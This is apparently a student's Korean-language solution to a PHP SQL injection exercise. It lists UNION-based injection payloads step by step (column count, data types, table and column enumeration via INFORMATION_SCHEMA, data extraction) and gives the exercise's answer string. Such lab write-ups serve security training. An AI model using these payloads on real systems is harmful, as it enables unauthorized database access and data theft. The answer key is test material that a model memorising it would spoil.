@@ -1,0 +1,29 @@
+PHP 문제 12번
+
+1. 공격에 사용한 쿼리문 순서대로
+
+  1) 칼럼의 개수를 찾는 쿼리
+
+  삼성동' order by 5 #
+
+  2) 자료형 파악하는 쿼리
+
+  삼성동' union select 'null', null, null, null, null from dual #
+
+  삼성동' union select 'a', 'b', 'c', 'd', 'e' from dual #
+
+
+  3) 테이블 명 찾는 쿼리
+
+  삼성동' union select table_name, 'a','a','a','a' from INFORMATION_SCHEMA.TABLES #
+
+  4) union_answer 테이블의 컬럼명 구문
+
+  삼성동' union select column_name, 'a', 'a', 'a', 'a' from INFORMATION_SCHEMA.COLUMNS where table_name = 'union_answer ' #
+
+  5) 데이터 추출
+
+  삼성동' union select answer_column, null, null, null, null from union_answer  #
+
+
+2. 정답: this_is_answer_answer
